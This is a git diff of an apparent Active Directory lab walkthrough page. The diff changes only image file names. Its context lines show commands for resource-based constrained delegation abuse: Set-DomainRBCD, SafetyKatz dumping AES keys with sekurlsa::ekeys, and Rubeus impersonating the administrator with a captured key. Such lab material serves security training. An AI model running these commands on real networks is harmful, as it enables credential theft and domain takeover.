@@ -26,7 +26,7 @@ Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std613$' -Verbose
 Get-DomainRBCD
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 SourceName                 : DCORP-MGMT$
@@ -49,7 +49,7 @@ Now we need the AES keys of t student VM (as we configured RBCD for it above)
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>50083fa125e328c8b5333ac2dfc62c3e47eb8f6bc0acf08b1ca15eb35894140e</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>50083fa125e328c8b5333ac2dfc62c3e47eb8f6bc0acf08b1ca15eb35894140e</p></figcaption></figure>
 
 ```
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:dcorp-std613$ /aes256:50083fa125e328c8b5333ac2dfc62c3e47eb8f6bc0acf08b1ca15eb35894140e /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
